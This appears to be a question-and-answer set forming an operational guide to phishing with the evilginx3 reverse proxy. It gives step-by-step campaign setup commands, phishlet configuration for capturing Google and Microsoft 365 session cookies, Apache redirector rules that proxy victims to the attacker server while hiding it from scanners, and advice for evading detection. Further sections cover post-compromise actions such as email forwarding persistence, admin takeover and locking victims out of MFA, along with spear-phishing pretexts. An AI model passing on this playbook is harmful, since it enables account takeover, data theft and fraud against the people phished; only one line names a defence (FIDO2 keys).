What is evilginx3 and how does its reverse proxy architecture work for 2FA bypass?

Evilginx3 is a man-in-the-browser reverse proxy phishing framework that captures session cookies AFTER authentication including 2FA. Architecture: evilginx3 sits between the victim's browser and the legitimate site. Victim accesses phishing domain (e.g., accounts.g00gle.com) → evilginx3 proxies all requests to real Google → proxies responses back to victim → victim completes full authentication including TOTP/push 2FA → evilginx3 intercepts the session cookie before it reaches the browser. The victim has fully authenticated against the real service — the 2FA was real — but evilginx3 captured the resulting authenticated session token. Setup: evilginx3 requires a VPS with public IP, a domain, and DNS configured. Run: ./evilginx3 -p phishlets/ -developer (test mode) or without for production. Key advantage over credential phishing: captures already-authenticated sessions — password + 2FA is irrelevant to attacker.

How do you write a custom evilginx3 phishlet?

Phishlets are YAML configuration files defining how evilginx3 proxies a specific site. Structure: name, author, trigger_domains (what URLs the phishlet intercepts), proxy_hosts (real domain to proxy to), sub_filters (regex substitutions to replace real domain with phishing domain in HTML/JS), auth_tokens (what cookies to capture), credentials (what form fields to extract). Example structure: proxy_hosts - {phish_sub: '', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}. auth_tokens: [{domain: '.google.com', keys: ['SAPISID', 'SSID', 'APISID', 'HSID', 'SID']}]. sub_filters replace all occurrences of 'accounts.google.com' with phishing domain in HTML/JavaScript. credentials extract username from #identifierId input, password from input[type=password]. Key field — force_post: intercepts POST requests and extracts credential values. Test with: phishlets hostname TARGET phishing.domain && phishlets enable TARGET.

Walk through a complete evilginx3 campaign setup from VPS to session capture.

Step 1 — Infrastructure: VPS with public IP (use offshore provider for OpSec). Domain registered with privacy protection. Step 2 — DNS: A record *.phishingdomain.com → VPS IP. NS records pointing to your nameserver or use Cloudflare. Step 3 — evilginx3 config: ./evilginx3 -p phishlets/ then in console: config domain phishingdomain.com && config ipv4 public VPS_IP. Step 4 — Phishlet setup: phishlets hostname microsoft phishingdomain.com && phishlets enable microsoft. Evilginx3 auto-requests LetsEncrypt certs. Step 5 — Create lure: lures create microsoft → returns lure ID. lures get-url 0 → returns phishing URL. Step 6 — Target: send phishing URL to target (email, SMS, social). Step 7 — Capture: sessions command shows captured sessions. sessions get 1 shows full session data including cookies. Step 8 — Cookie import: copy captured cookies into browser using EditThisCookie extension or Cookie Editor. Navigate to legitimate site — authenticated as victim.

How do evilginx3 redirectors work and why are they important for detection evasion?

Redirectors are intermediary servers that sit between phishing email links and the evilginx3 server, filtering traffic and reducing exposure. Purpose: 1) Filter non-target traffic (bots, security scanners, wrong geolocations) — only forward real victims. 2) Create attribution buffer — phishing URL points to redirector, not directly to evilginx3. 3) Redirect scanners and analysis tools to legitimate sites. 4) Hide evilginx3 IP from reputation databases. Apache/Nginx redirector setup: mod_rewrite rules that check User-Agent (block: curl, wget, python-requests, scanner signatures), check Geolocation (only forward target country), check referrer. Example Apache rule: RewriteCond %{HTTP_USER_AGENT} 'bot|crawler|spider|scraper' [NC] RewriteRule .* https://legitimate-site.com [R=301,L]. Only matching traffic forwarded to: RewriteRule ^(.*)$ https://EVILGINX_IP/$1 [P,L]. Use Cloudflare Workers as redirector with JavaScript-based fingerprinting. 'CloudKill' technique uses Cloudflare's free tier hiding origin IP behind CDN.

What are the detection mechanisms for evilginx3 and how do you evade them?

Detection vectors and evasion: 1) SSL certificate transparency: evilginx3's Let's Encrypt cert for phishing domain appears in CT logs. Evasion: use wildcard cert purchased commercially (not CT logged) or pre-generate before campaign. 2) Domain reputation: new domains flagged by email security gateways. Evasion: age domain 30+ days before use, categorize via URL categorization services, use typosquat of legitimate domain. 3) Browser security warnings: Chrome/Firefox Safe Browsing flags known phishing. Evasion: unique domains per target, rapid domain rotation. 4) HTML content analysis: security scanners detect replicated login pages. Evasion: modify page structure, add unique noise per session. 5) Anti-phishing tokens: Microsoft and Google embed CSRF tokens that change per request. Evilginx3 handles this via transparent proxying. 6) FIDO2/WebAuthn hardware keys: bound to origin domain — phishing domain won't satisfy authentication, credential NOT capturable. This is the only reliable 2FA bypass countermeasure.

How does evilginx3 handle Microsoft 365 and capture O365 session tokens?

Microsoft 365 uses multiple authentication flows. Evilginx3 M365 phishlet targets login.microsoftonline.com. Key M365 session cookies to capture: ESTSAUTH, ESTSAUTHPERSISTENT, ESTSAUTHLIGHT — these are the primary session tokens. Also capture: OIDCAuth, fpc cookie, sso_reload_count, MSPOK. The phishlet sub_filters must rewrite: 'login.microsoftonline.com', 'account.microsoft.com', 'logincdn.msauth.net', and all Microsoft auth CDN domains. Critical: Microsoft uses JavaScript-based domain checks — sub_filters must handle inline JS strings containing the real domain. After capture: import ESTSAUTH + ESTSAUTHPERSISTENT cookies into browser on microsoftonline.com. Access O365 portal (office.com, outlook.com, etc.). Session typically valid 1-7 days depending on Conditional Access policies. CAP limitation: if target org has Conditional Access Policy requiring compliant/hybrid-joined device, session from attacker machine may be blocked even with valid cookie.

What post-exploitation is possible after capturing evilginx3 session cookies?

Immediate actions after session capture: 1) Email access (O365/Gmail): read all email including MFA codes, password reset emails. Set up email forwarding rules for persistence. Search for VPN credentials, internal documentation, API keys. 2) Cloud storage (OneDrive/SharePoint/Google Drive): download all files. 3) Admin escalation: check if captured account has Global Admin (O365) or Super Admin (Google Workspace) — full tenant takeover. Add attacker-controlled account as admin. 4) OAuth token abuse: authenticate to connected third-party apps using the SSO session. 5) Password reset chain: use email access to reset passwords for other accounts (banks, crypto exchanges, other services). 6) Token refresh abuse: OAuth refresh tokens in some captures allow long-term access without re-phishing. 7) MFA modification: add attacker's phone as MFA device, remove victim's MFA — lock out legitimate user. 8) Lateral movement: use O365 session to access Azure portal, read Azure AD users, move to connected cloud resources.

How do you use evilginx3 lures for spear phishing campaigns?

Lures are the actual phishing URLs generated by evilginx3 that contain encoded session IDs for tracking. Lure management: lures create microsoft creates a lure for microsoft phishlet. lures edit 0 -redirect-url https://microsoft.com changes post-capture redirect. lures edit 0 -ua-filter 'Windows' only serves to Windows users. Tracking: each lure has a unique ID that tracks who clicked — correlate with target list. Spear phishing pretexts for M365 lures: 1) 'Shared document' notification — spoofed SharePoint notification email, link goes to lure. 2) MFA re-enrollment — 'Your MFA method has been updated, re-verify now'. 3) Password expiry — 'Your password expires in 3 days, click to reset'. 4) Voicemail notification with audio attachment link. 5) IT security alert — 'Unusual sign-in detected, verify your identity'. Email delivery: use legitimate email services (SendGrid, Mailgun) to bypass spam filters. Spoof from IT department domain using DMARC-passing subdomain. GoPhish for campaign tracking and analytics.
